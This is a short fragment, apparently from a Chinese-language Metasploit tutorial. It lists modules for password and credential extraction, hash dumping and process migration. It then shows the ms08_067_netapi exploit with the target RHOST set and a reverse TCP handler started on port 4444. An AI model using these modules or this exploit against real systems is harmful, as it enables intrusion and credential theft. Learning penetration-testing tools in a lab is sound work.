...
=========
   ...
   admin/http/netgear_soap_password_extractor                                      normal  Netgear Unauthenticated SOAP Password Extractor
   ...
   admin/scada/advantech_webaccess_dbvisitor_sqli                 2014-04-08       normal  Advantech WebAccess SQL Injection
   ...
   dos/http/android_stock_browser_iframe_dos_cve_2012_6301        2012-12-01       normal  Android Stock Browser Iframe DOS
   ...
   gather/chromecast_wifi                                                          normal  Chromecast Wifi Enumeration
   ...
   gather/dns_cache_scraper                                                        normal  DNS Non-Recursive Record Scraper
   ...
   scanner/http/jenkins_enum                                                       normal  Jenkins Enumeration
   ...
   scanner/ipmi/ipmi_dumphashes                                   2013-06-20       normal  IPMI 2.0 RAKP Remote SHA1 Password Hash Retreival
   ...
   scanner/udp_scanner_template                                   2014-03-15       normal  UDP Scanner Example
   ...
   server/tnftp_savefile                                          2014-10-28       normal  tnftp "savefile" Arbitrary Command Execution
...
====
   ...
   multi/gather/lastpass_creds                                       normal  LastPass Master Password Extractor
   ...
   windows/manage/smart_migrate                                      normal  Windows Manage Smart Process Migration
...
```
再次查看选项参数发现RHOST就已经设置成了192.168.1.3
```
msf exploit(ms08_067_netapi) > show options
...
[*] Started reverse TCP handler on 219.225.51.111:4444 
